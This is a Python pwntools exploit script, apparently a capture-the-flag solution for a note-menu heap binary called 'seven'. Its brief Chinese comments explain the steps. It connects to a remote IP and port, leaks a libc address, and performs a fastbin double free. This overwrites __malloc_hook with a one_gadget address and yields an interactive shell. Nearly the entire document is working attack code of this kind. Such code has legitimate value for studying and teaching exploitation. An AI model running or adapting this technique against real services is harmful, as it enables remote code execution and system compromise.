# -*- coding: utf-8 -*-

from pwn import *
context(os='linux',arch='amd64',log_level='info')

flag = 1
if flag == 0 :
    sh = process("./seven")
else:
    sh = remote("58.240.236.231","9002")

libc = ELF("libc.so.6")
elf = ELF("seven")

def debug():
    gdb.attach(sh)

def add(size,content):
    sh.recvuntil("Your choice :")
    sh.sendline("1")
    sh.recvuntil("Note size :")
    sh.sendline(str(size))
    sh.recvuntil("Content :")
    sh.send(content)

def delete(index):
    sh.recvuntil("Your choice :")
    sh.sendline("2")
    sh.recvuntil("Index :")
    sh.sendline(str(index))

def show(index):
    sh.recvuntil("Your choice :")
    sh.sendline("3")
    sh.recvuntil("Index :")
    sh.sendline(str(index))
#one_gadget，执行execve("/bin/sh")
libc_one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]

add(0x100,'0000')#0
add(0x68,'1111')#1
add(0x68,'2222')#2
delete(0)
add(0x100,'a'*8)#0

#获取__malloc_hook的地址
show(0)
data = sh.recv(16)
addr__malloc_hook = u64(data[8:14].ljust(8, b'\00')) - 0x58 - 0x10
print("addr__malloc_hook="+hex(addr__malloc_hook))

#由__malloc_hook地址获得libc基址，从而获得system地址
libc_base = addr__malloc_hook - libc.symbols['__malloc_hook']
sys_addr = libc_base + libc.symbols['system']
addr_one_gadget = libc_base + libc_one_gadget[3]
print("libc_base="+hex(libc_base))
print("sys_addr="+hex(sys_addr))
print("addr_one_gadget="+hex(addr_one_gadget))
#debug()
#进行double free，适合构造fake_chunk的地址位于addr__malloc_hook - 0x23处
delete(1)
delete(2)
delete(1)
add(0x60, p64(addr__malloc_hook - 0x23))
add(0x60, p64(addr__malloc_hook - 0x23))
add(0x60, p64(addr__malloc_hook - 0x23))
add(0x60, 'a' * 0x13 + p64(addr_one_gadget))
#debug()
sh.sendlineafter(':', '1')
sh.sendlineafter('Note size :', '1')

sh.interactive()
sh.close()